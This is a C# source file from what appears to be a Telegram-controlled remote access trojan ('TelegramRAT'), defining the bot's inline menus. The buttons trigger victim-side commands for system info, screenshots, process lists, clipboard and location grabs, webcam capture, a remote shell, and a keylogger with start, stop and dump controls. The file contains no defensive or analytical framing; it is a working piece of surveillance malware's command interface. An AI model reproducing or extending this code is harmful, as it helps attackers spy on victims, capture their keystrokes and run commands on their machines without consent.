namespace TelegramRAT.Telegram;

using System.Text.Json;

internal static class InlineKeyboard
{
    public static string MainMenu()
    {
        var keyboard = new
        {
            inline_keyboard = new[]
            {
                new[]
                {
                    new { text = "\uD83D\uDDA5 System Info", callback_data = "/sysinfo" },
                    new { text = "\uD83D\uDCF7 Screenshot", callback_data = "/screenshot" }
                },
                new[]
                {
                    new { text = "\uD83D\uDCC2 Processes", callback_data = "/processes" },
                    new { text = "\u2328\uFE0F Keylogger", callback_data = "/keylog status" }
                },
                new[]
                {
                    new { text = "\uD83D\uDCCB Clipboard", callback_data = "/clipboard" },
                    new { text = "\uD83D\uDCCD Location", callback_data = "/location" }
                },
                new[]
                {
                    new { text = "\uD83C\uDFA5 Webcam", callback_data = "/webcam" },
                    new { text = "\uD83D\uDCBB Shell", callback_data = "/shell whoami" }
                }
            }
        };

        return JsonSerializer.Serialize(keyboard);
    }

    public static string KeyloggerMenu()
    {
        var keyboard = new
        {
            inline_keyboard = new[]
            {
                new[]
                {
                    new { text = "\u25B6\uFE0F Start", callback_data = "/keylog start" },
                    new { text = "\u23F9\uFE0F Stop", callback_data = "/keylog stop" },
                    new { text = "\uD83D\uDCE5 Dump", callback_data = "/keylog dump" }
                }
            }
        };

        return JsonSerializer.Serialize(keyboard);
    }
}
